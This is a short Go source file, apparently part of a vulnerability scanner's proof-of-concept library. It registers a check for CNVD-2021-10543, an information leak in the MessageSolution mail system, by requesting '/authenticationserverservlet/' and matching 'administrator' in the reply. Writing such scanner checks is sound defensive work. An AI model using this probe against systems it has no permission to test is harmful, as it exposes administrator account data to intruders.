package poc

func (Info *PocInfo) CNVD_2021_10543_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CNVD-2021-10543"
	poc.Info.Target = "messagesolution"
	poc.Info.Type = "INFO"
	poc.Info.Name = "MessageSolution Mail System EEA INFO"
	poc.Info.Level = 2
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/authenticationserverservlet/"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"administrator"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
